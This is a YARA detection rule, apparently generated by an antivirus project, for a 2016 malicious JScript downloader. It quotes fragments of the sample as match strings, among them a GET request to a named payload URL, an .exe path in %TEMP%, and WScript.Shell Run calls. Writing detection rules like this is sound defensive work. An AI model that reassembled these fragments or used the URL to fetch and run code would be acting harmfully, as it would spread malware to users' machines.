rule sig_20160329_4afc27544a07a831b76b2f6a539b2299 {
  meta:
    description = "datamaliciousorder - file 20160329_4afc27544a07a831b76b2f6a539b2299.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "d228438e02fe138ea43098b89205b7bc21c0f7493404773e74ead5ce5a0bffdc"

  strings:
    $s1  = "function Vdzmtlh() {return Ksydd[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"0M8rDTItj4TSomRb.exe\";};" fullword ascii
    $s2  = "do {WScript[Npkfoscf](Osijkf() * 11)} while (Uvjmmm[\"readystate\"] < 2 * 2);" fullword ascii
    $s3  = "var Ksydd = function Qytifnqkst() {return WScript[Fahhjgw](\"WScript.Shell\");}();" fullword ascii
    $s4  = "function Nwiwe(Atilsxq, Oivrxegz){return Atilsxq - Oivrxegz;};" fullword ascii
    $s5  = "Uvjmmm[Dhzbh](\"GET\", \"http://www.qubefurniture.co.uk/lsd3ka\", false);" fullword ascii
    $s6  = "function Kalvnzhf(Czqkjfi){Ksydd[\"Run\"](Czqkjfi, Qfrsfe, Qfrsfe);};" fullword ascii
    $s7  = "function Mhufuwl() {return ((Kfzgj == true) && (Kfzgj == Ydnsfn)) ? 1 : Qfrsfe;};" fullword ascii
    $s8  = " while (Yzusz){" fullword ascii
    $s9  = "function Osijkf(){return 22;};" fullword ascii
    $s10 = "function Qorsi()" fullword ascii
    $s11 = "function Ivcyadli(){return Emhnyvae;};" fullword ascii
    $s12 = "var Taudgkgdm = new this[\"Date\"]();" fullword ascii
    $s13 = "var Rpvlvg = false;" fullword ascii
    $s14 = "Ydnsfn = true; " fullword ascii
    $s15 = "Kfzgj = true; " fullword ascii
    $s16 = "function Igonweuz(Lzlsaqluql) {var Okyvwfas = (1, 2, 3, 4, 5, Lzlsaqluql); return Okyvwfas;};" fullword ascii
    $s17 = "return Nwiwe(Pvrvehmh, Lorwcdxe);" fullword ascii
    $s18 = "function Eurrxoht(){return Fahhjgw;};" fullword ascii
    $s19 = "var Kfzgj = false;" fullword ascii
    $s20 = "var Ydnsfn = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}